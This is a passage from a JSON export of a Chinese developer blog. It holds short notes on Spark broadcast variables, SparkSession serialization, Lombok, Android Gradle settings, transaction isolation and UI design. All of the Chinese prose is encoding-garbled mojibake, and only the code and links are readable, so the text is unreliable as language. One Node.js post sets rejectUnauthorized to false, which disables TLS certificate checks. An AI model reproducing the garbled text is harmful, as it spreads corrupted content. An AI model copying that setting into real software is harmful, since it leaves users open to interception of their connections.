Sparkçš„å¦ä¸€ç§å…±äº«å˜é‡æ˜¯å¹¿æ’­å˜é‡ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªRDDçš„å¾ˆå¤šæ“ä½œéƒ½éœ€è¦ä½¿ç”¨driverä¸­å®šä¹‰çš„å˜é‡æ—¶ï¼Œæ¯æ¬¡æ“ä½œï¼Œdriveréƒ½è¦æŠŠå˜é‡å‘é€ç»™workerèŠ‚ç‚¹ä¸€æ¬¡ï¼Œå¦‚æœè¿™ä¸ªå˜é‡ä¸­çš„æ•°æ®å¾ˆå¤§çš„è¯ï¼Œä¼šäº§ç”Ÿå¾ˆé«˜çš„ä¼ è¾“è´Ÿè½½ï¼Œå¯¼è‡´æ‰§è¡Œæ•ˆç‡é™ä½ã€‚ä½¿ç”¨å¹¿æ’­å˜é‡å¯ä»¥ä½¿ç¨‹åºé«˜æ•ˆåœ°å°†ä¸€ä¸ªå¾ˆå¤§çš„åªè¯»æ•°æ®å‘é€ç»™å¤šä¸ªworkerèŠ‚ç‚¹ï¼Œè€Œä¸”å¯¹æ¯ä¸ªworkerèŠ‚ç‚¹åªéœ€è¦ä¼ è¾“ä¸€æ¬¡ï¼Œæ¯æ¬¡æ“ä½œæ—¶executorå¯ä»¥ç›´æ¥è·å–æœ¬åœ°ä¿å­˜çš„æ•°æ®å‰¯æœ¬ï¼Œä¸éœ€è¦å¤šæ¬¡ä¼ è¾“ã€‚ æ‰€ä»¥è¿™é‡Œæ¥ç€ä½¿ç”¨å¹¿æ’­å˜é‡ï¼ŒæŠŠmultisetä¸¢è¿›å»ï¼Œç„¶ååœ¨åšä¸€ä¸ªrddæ›´æ–°çš„æ“ä½œã€‚è¿™ä¸ªæ—¶å€™åœ¨mapç®—å­ä¸­å¯ä»¥æ­£ç¡®è·å¾—ä¸Šé¢multisetçš„æ­£ç¡®ç»“æœ val broadcast = spark.sparkContext.broadcast(multiset)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"nodejs request è®¾ç½®è¯ä¹¦å…éªŒè¯ å’Œ 30x ä¸è·³è½¬","slug":"history/tech/5a3fa772c3dae4117dfd3f23","date":"2017-12-24T01:11:14.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3fa772c3dae4117dfd3f23/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3fa772c3dae4117dfd3f23/","excerpt":"","text":"ä»£ç const request = require('request'); const Promise = require(&quot;bluebird&quot;); const httpPOST = Promise.promisify(request.post); const httpGET = Promise.promisify(request.get); const options = { header: {}, method: 'GET', uri: this.signUrl, gzip : true, followRedirect: false, followAllRedirects: false, agentOptions: { rejectUnauthorized: false }, timeout: 20000 } let ret = await httpGET(options); https://www.npmjs.com/package/request#using-optionsagentoptionshttps://nodejs.org/api/tls.html#tls_tls_connect_options_callback","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spark   package ä»“åº“","slug":"history/tech/5a3d35b9c3dae4117dfd3f21","date":"2017-12-23T04:41:29.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3d35b9c3dae4117dfd3f21/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3d35b9c3dae4117dfd3f21/","excerpt":"","text":"https://spark-packages.org","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"nodejs mysql åº“","slug":"history/tech/5a3e1cb1c3dae4117dfd3f22","date":"2017-12-22T21:06:57.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3e1cb1c3dae4117dfd3f22/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3e1cb1c3dae4117dfd3f22/","excerpt":"","text":"http://knexjs.org","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"lombok @EqualsAndHashCode","slug":"history/tech/5a388e26c3dae4117dfd3f20","date":"2017-12-19T03:57:26.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a388e26c3dae4117dfd3f20/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a388e26c3dae4117dfd3f20/","excerpt":"","text":"@Dataç›¸å½“äº@Getter @Setter @RequiredArgsConstructor @ToString @EqualsAndHashCodeè¿™5ä¸ªæ³¨è§£çš„åˆé›†ã€‚1. æ­¤æ³¨è§£ä¼šç”Ÿæˆequals(Object other) å’Œ hashCode()æ–¹æ³•ã€‚ 2. å®ƒé»˜è®¤ä½¿ç”¨éé™æ€ï¼Œéç¬æ€çš„å±æ€§ 3. å¯é€šè¿‡å‚æ•°excludeæ’é™¤ä¸€äº›å±æ€§ 4. å¯é€šè¿‡å‚æ•°ofæŒ‡å®šä»…ä½¿ç”¨å“ªäº›å±æ€§ 5. å®ƒé»˜è®¤ä»…ä½¿ç”¨è¯¥ç±»ä¸­å®šä¹‰çš„å±æ€§ä¸”ä¸è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³• 6. å¯é€šè¿‡callSuper=trueè§£å†³ä¸Šä¸€ç‚¹é—®é¢˜ã€‚è®©å…¶ç”Ÿæˆçš„æ–¹æ³•ä¸­è°ƒç”¨çˆ¶ç±»çš„æ–¹æ³•ã€‚ å½“ä½¿ç”¨@Dataæ³¨è§£æ—¶ï¼Œåˆ™æœ‰äº†@EqualsAndHashCodeæ³¨è§£ï¼Œé‚£ä¹ˆå°±ä¼šåœ¨æ­¤ç±»ä¸­å­˜åœ¨equals(Object other) å’Œ hashCode()æ–¹æ³•ï¼Œä¸”ä¸ä¼šä½¿ç”¨çˆ¶ç±»çš„å±æ€§ï¼Œè¿™å°±å¯¼è‡´äº†å¯èƒ½çš„é—®é¢˜ã€‚ æœ‰å¤šä¸ªç±»æœ‰ç›¸åŒçš„éƒ¨åˆ†å±æ€§ï¼ŒæŠŠå®ƒä»¬å®šä¹‰åˆ°çˆ¶ç±»ä¸­ï¼Œæ°å¥½idï¼ˆæ•°æ®åº“ä¸»é”®ï¼‰ä¹Ÿåœ¨çˆ¶ç±»ä¸­ï¼Œé‚£ä¹ˆå°±ä¼šå­˜åœ¨éƒ¨åˆ†å¯¹è±¡åœ¨æ¯”è¾ƒæ—¶ï¼Œå®ƒä»¬å¹¶ä¸ç›¸ç­‰ï¼Œå´å› ä¸ºlombokè‡ªåŠ¨ç”Ÿæˆçš„equals(Object other) å’Œ hashCode()æ–¹æ³•åˆ¤å®šä¸ºç›¸ç­‰ï¼Œä»è€Œå¯¼è‡´å‡ºé”™ã€‚ ä¿®å¤ï¼š ä½¿ç”¨@Getter @Setter @ToStringä»£æ›¿@Dataå¹¶ä¸”è‡ªå®šä¹‰equals(Object other) å’Œ hashCode()æ–¹æ³•ï¼Œæ¯”å¦‚æœ‰äº›ç±»åªéœ€è¦åˆ¤æ–­ä¸»é”®idæ˜¯å¦ç›¸ç­‰å³è¶³çŸ£ã€‚ æˆ–è€…ä½¿ç”¨åœ¨ä½¿ç”¨@Dataæ—¶åŒæ—¶åŠ ä¸Š@EqualsAndHashCode(callSuper=true)æ³¨è§£ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Annotation processors must be explicitly declared now","slug":"history/tech/5a3880dac3dae4117dfd3f1f","date":"2017-12-19T03:00:42.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3880dac3dae4117dfd3f1f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3880dac3dae4117dfd3f1f/","excerpt":"","text":"app build.gradle ä¸­å¢åŠ é…ç½® defaultConfig { applicationId &quot;org.qianrushi.android&quot; minSdkVersion 15 targetSdkVersion 24 versionCode 2 versionName &quot;1.1&quot; javaCompileOptions { annotationProcessorOptions { includeCompileClasspath = true } } }","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"android","slug":"android","permalink":"https://wangxiuwen.github.io/tags/android/"}],"author":"wangxiuwen"},{"title":"å‰ç«¯åˆ‡å›¾","slug":"history/tech/5a377655c3dae4117dfd3f1e","date":"2017-12-17T20:03:33.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a377655c3dae4117dfd3f1e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a377655c3dae4117dfd3f1e/","excerpt":"","text":"åˆ‡å›¾æµ‹é‡(çŸ©å½¢é€‰æ¡†å·¥å…·ï¼Œä¿¡æ¯é¢æ¿) å®½åº¦ã€é«˜åº¦ å†…è¾¹è·ã€å¤–è¾¹è· è¾¹æ¡† å®šä½ æ–‡å­—å¤§å° è¡Œé«˜ èƒŒæ™¯å›¾ä½ç½® å–è‰²(æ‹¾è‰²å™¨&amp;å¸ç®¡å·¥å…·) è¾¹æ¡†è‰² èƒŒæ™¯è‰² æ–‡å­—è‰² åˆ‡å›¾åŠåˆ‡å›¾çš„å„ç§æ“ä½œéšè—æ–‡å­—ï¼ˆç‹¬ç«‹å›¾å±‚å’Œéç‹¬ç«‹å›¾å±‚çš„ä¸åŒæ“ä½œæ–¹æ³•ï¼‰ png8å’Œpng24æ ¼å¼çš„åˆ‡å›¾æ–¹å¼ å¯å¹³é“ºèƒŒæ™¯çš„åˆ‡å›¾æ–¹å¼åŠæ´»åŠ¨é¡µçš„åˆ‡å›¾æ–¹å¼ é­”æ£’å·¥å…·åˆ¤æ–­èƒŒæ™¯è‰²æ˜¯å¦æ˜¯çº¿æ€§æ¸å˜å®¹å·®è°ƒæ•´åˆ°é›¶ï¼Œåœ¨èƒŒæ™¯ä¸Šç‚¹å‡» å›¾ç‰‡åˆå¹¶æ—¶ä¿ç•™ç©ºéš™ï¼š å¦‚æœæ˜¯å°å›¾æ ‡ï¼Œç•™çš„ç©ºéš™å¯é€‚å½“å°ä¸€äº›ï¼Œä¸€èˆ¬20åƒç´ å·¦å³ï¼›é‚£å¦‚æœæ˜¯å¤§å›¾æ ‡ï¼Œè¦ç•™çš„ç©ºéš™å°±è¦å¤§ä¸€ç‚¹ï¼Œå› ä¸ºå¤§å›¾æ ‡åœ¨è°ƒæ•´çš„æ—¶å€™ï¼Œå½±å“åˆ°çš„ç©ºé—´ä¹Ÿä¼šæ¯”è¾ƒå¤§ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"css sprite å›¾ç‰‡ç²¾çµ","slug":"history/tech/5a377602c3dae4117dfd3f1d","date":"2017-12-17T20:02:10.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a377602c3dae4117dfd3f1d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a377602c3dae4117dfd3f1d/","excerpt":"","text":"http://alistapart.com/article/sprites","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spring MVC web æ¡†æ¶","slug":"history/tech/5a34704147e0b7d3188a6a47","date":"2017-12-16T01:00:49.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a34704147e0b7d3188a6a47/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a34704147e0b7d3188a6a47/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spring MVC","slug":"history/tech/5a346fc947e0b7d3188a6a46","date":"2017-12-16T00:58:49.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a346fc947e0b7d3188a6a46/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a346fc947e0b7d3188a6a46/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spring JDBC","slug":"history/tech/5a345bec47e0b7d3188a6a45","date":"2017-12-15T23:34:04.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a345bec47e0b7d3188a6a45/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a345bec47e0b7d3188a6a45/","excerpt":"","text":"æ•´åˆ Mybatis","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"spring IOC","slug":"history/tech/5a33435147e0b7d3188a6a3f","date":"2017-12-15T03:36:49.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a33435147e0b7d3188a6a3f/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a33435147e0b7d3188a6a3f/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ui è§„èŒƒè®¾è®¡çš„æ³¨æ„äº‹é¡¹","slug":"history/ui/5a33e93947e0b7d3188a6a44","date":"2017-12-15T03:24:41.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a33e93947e0b7d3188a6a44/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a33e93947e0b7d3188a6a44/","excerpt":"","text":"ui è§„èŒƒè®¾è®¡çš„æ³¨æ„äº‹é¡¹è§„èŒƒçš„è¯¦å°½ç¨‹åº¦ å†…å®¹ ç»†èŠ‚ å®é™…å·¥ä½œä¸­ UI è§„èŒƒçš„ä½¿ç”¨ UIè§„èŒƒçš„æ›´æ–°ä¸æ‹“å±•","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"ui è§„èŒƒè®¾è®¡çš„æ³¨æ„äº‹é¡¹","slug":"history/ui/5a33e89a47e0b7d3188a6a43","date":"2017-12-15T03:22:02.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a33e89a47e0b7d3188a6a43/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a33e89a47e0b7d3188a6a43/","excerpt":"","text":"ui è§„èŒƒè®¾è®¡çš„æ³¨æ„äº‹é¡¹è§„èŒƒçš„è¯¦å°½ç¨‹åº¦ å†…å®¹ ç»†èŠ‚ å®é™…å·¥ä½œä¸­ UI è§„èŒƒçš„ä½¿ç”¨å’ŒUIè§„èŒƒçš„æ›´æ–°ä¸æ‹“å±•","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"Spark å®æˆ˜ SparkSession ä½¿ç”¨å°è®°","slug":"history/tech/5a333e3147e0b7d3188a6a3e","date":"2017-12-15T03:14:57.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a333e3147e0b7d3188a6a3e/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a333e3147e0b7d3188a6a3e/","excerpt":"","text":"æµç¨‹æè¿°ä½¿ç”¨spark å’Œ kafka åšæ•°æ®å¤„ç†ã€‚å°†æ¥å—çš„kafkaç§çš„æ¶ˆæ¯ã€‚æŒ‰ç…§æ¶ˆæ¯çš„ç±»å‹ï¼Œå»æ‰§è¡Œä¸åŒçš„ä»»åŠ¡å¤„ç†å™¨ã€‚åœ¨è·å–kafka ä¿¡æ¯æµçš„rddä¸­çš„jobæ—¶ foreachjob æ ¹æ®jobTypeå¯¹è±¡è¿›è¡Œä¼ è¾“sparkSession å¯¹è±¡ä¸­ã€‚ val jobs = rdd.map(x =&gt; { // println(x) var j = JSON.parseFull(x).get.asInstanceOf[Map[String, Any]] var jobType = j.getOrElse(JOB_TYPE, &quot;test&quot;).asInstanceOf[String] var msg = j.get(JOB_MSG).get.asInstanceOf[String] Job(jobType, msg) }) jobs.foreach(job =&gt; { println(job.jobType) println(job.msg) val ps: EtlProcess = job.jobType match { case &quot;oss&quot; =&gt; new EtlProcess with OssImportProcess case &quot;audit&quot; =&gt; new EtlProcess with AuditDataProcess } ps.process(spark, job.msg) }) åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ï¼Œrddçš„ç®—å­ä¸­å–foreach ä»»ä½•æ•°æ®éƒ½ä¼šåºåˆ—åŒ– ç”±äºsparkSession ä¸èƒ½è¢«åºåˆ—åŒ–ï¼Œå‡ºç°ä¸ºnullçš„æƒ…å†µ åŸå› æŸ¥çœ‹æºç ï¼Œç±»ä¼¼è¿™ç§rddçš„actionæ“ä½œï¼Œrddä¼šæŠŠä»»åŠ¡åˆ†å‘å¤„ç† runJob è¿™ä¸ªè¿‡ç¨‹çš„ä¼šè¢«åºåˆ—åŒ–çš„ã€‚ /** * Applies a function f to all elements of this RDD. */ def foreach(f: T =&gt; Unit): Unit = withScope { val cleanF = sc.clean(f) sc.runJob(this, (iter: Iterator[T]) =&gt; iter.foreach(cleanF)) } è§£å†³åŠæ³•ä½¿ç”¨collect æˆ–è€… toLocalIterator è¿”å›éœ€è¦å¤„ç†çš„æ•°æ®æ•°ç»„ï¼Œè¿™ä¸ªä½¿ç”¨å·²ç»rdd ç®—å®Œçš„ç»“æœäº†ã€‚å†å»foreachæ ¹æœ¬ä¸ä¼šéœ€è¦åºåˆ—åŒ– val jobs = rdd.map(x =&gt; { // println(x) var j = JSON.parseFull(x).get.asInstanceOf[Map[String, Any]] var jobType = j.getOrElse(JOB_TYPE, &quot;test&quot;).asInstanceOf[String] var msg = j.get(JOB_MSG).get.asInstanceOf[String] Job(jobType, msg) }).toLocalIterator","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"spark","slug":"spark","permalink":"https://wangxiuwen.github.io/tags/spark/"},{"name":"scala","slug":"scala","permalink":"https://wangxiuwen.github.io/tags/scala/"}],"author":"baipeng"},{"title":"Mybatis","slug":"history/tech/5a33395c47e0b7d3188a6a3d","date":"2017-12-15T02:54:20.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a33395c47e0b7d3188a6a3d/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a33395c47e0b7d3188a6a3d/","excerpt":"","text":"ä¸€èˆ¬è®¾ç½®ä¸º 2~3åˆ†é’Ÿ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Mybatis","slug":"history/tech/5a33393d47e0b7d3188a6a3c","date":"2017-12-15T02:53:49.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a33393d47e0b7d3188a6a3c/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a33393d47e0b7d3188a6a3c/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"web ç«¯è®¾è®¡è§„èŒƒ","slug":"history/ui/5a33e10947e0b7d3188a6a42","date":"2017-12-15T02:49:45.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a33e10947e0b7d3188a6a42/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a33e10947e0b7d3188a6a42/","excerpt":"","text":"web ç«¯è®¾è®¡è§„èŒƒè‰²å½©è§„èŒƒ å›¾æ ‡è§„èŒƒ æ§ä»¶è§„èŒƒ æ’ç‰ˆè§„èŒƒ 12å·å®‹ä½“å½“å®ƒæ˜¯åƒç´ æ–‡å­—çš„æƒ…å†µä¸‹ï¼Œå®ƒçœ‹å¾—æ˜¯æœ€æ¸…æ™°çš„ã€‚æ¯”å…¶å®ƒçš„ä¸€äº›å¹³æ»‘ï¼Œæµ‘åšæˆ–è€…åŠ ç²—éƒ½è¦æ¥çš„æ¸…æ™°å¾ˆå¤š","categories":[{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/categories/UI/"}],"tags":[{"name":"ui","slug":"ui","permalink":"https://wangxiuwen.github.io/tags/ui/"},{"name":"UI","slug":"UI","permalink":"https://wangxiuwen.github.io/tags/UI/"}],"author":"wangxiuwen"},{"title":"Mybatis","slug":"history/tech/5a3336fd47e0b7d3188a6a3b","date":"2017-12-15T02:44:13.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a3336fd47e0b7d3188a6a3b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a3336fd47e0b7d3188a6a3b/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Mybatis","slug":"history/tech/5a33364e47e0b7d3188a6a3a","date":"2017-12-15T02:41:18.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a33364e47e0b7d3188a6a3a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a33364e47e0b7d3188a6a3a/","excerpt":"","text":"","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"äº‹åŠ¡","slug":"history/tech/5a332e2f47e0b7d3188a6a39","date":"2017-12-15T02:06:39.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a332e2f47e0b7d3188a6a39/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a332e2f47e0b7d3188a6a39/","excerpt":"","text":"è¯»æœªæäº¤ : å…è®¸è„è¯»è¯»æäº¤: ä¸å…è®¸è„è¯»ï¼Œä½†æ˜¯å…è®¸ä¸å¯é‡å¤è¯», ä¸¤æ¬¡è¯»å–åŒä¸€è¡Œè®°å½•çš„å€¼æœ‰å¯èƒ½ä¸ä¸€æ ·é‡å¤è¯»: ä¸å…è®¸ä¸å¯é‡å¤è¯», ä½†æ˜¯æœ‰å¯èƒ½å‡ºç°å¹»è¯»ä¸²è¡ŒåŒ–: ä¸å…è®¸å‡ºç°å¹»è¯»ï¼Œå¹¶å‘æ§åˆ¶æœ€ä¸ºä¸¥æ ¼","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ç§»åŠ¨ç«¯è®¾è®¡è§„èŒƒä¹‹åˆ‡å›¾","slug":"history/ui/5a33238f47e0b7d3188a6a38","date":"2017-12-15T01:21:19.000Z","updated":"2020-11-29T01:42:08.779Z","comments":true,"path":"history/ui/5a33238f47e0b7d3188a6a38/","link":"","permalink":"https://wangxiuwen.github.io/history/ui/5a33238f47e0b7d3188a6a38/","excerpt":"","text":"ç§»åŠ¨ç«¯è®¾è®¡è§„èŒƒä¹‹åˆ‡å›¾åˆ‡å›¾çš„æ¦‚å¿µ åˆ‡å›¾çš„è¾“å‡ºè¦æ±‚ åˆ‡å›¾çš„å°ºå¯¸ å¿«é€Ÿåˆ‡å›¾çš„æ–¹æ³• åˆ‡å›¾çš„å‘½åè§„èŒƒ å®‰å“.9.png çš„åˆ‡å›¾å’Œåˆ‡å›¾æ³¨æ„äº‹é¡¹ åºå·1å’Œåºå·2æ ‡è¯†äº†å¯ä»¥æ‹‰ä¼¸çš„åŒºåŸŸåºå·3å’Œåºå·4æ ‡è¯†äº†å†…å®¹åŒºåŸŸå½“è®¾å®šäº†æŒ‰é’®çš„å®é™…åº”ç”¨çš„é«˜å®½ä¹‹åï¼Œæ¨ªå‘ä¼šæ‹‰ä¼¸åºå·1åŒºåŸŸçš„åƒç´ ï¼Œçºµå‘ä¼šæ‹‰ä¼¸åºå·2åŒºåŸŸçš„åƒç´ åœ¨ä¿®æ”¹è¿‡ç¨‹ä¸­å¸Œæœ› .9.png ä¸è¢«æ‹‰ä¼¸ï¼Œåªè¦æŠŠæ‹‰ä¼¸åŒºåŸŸçš„ç‚¹ç‚¹åœ¨é€æ˜åƒç´ 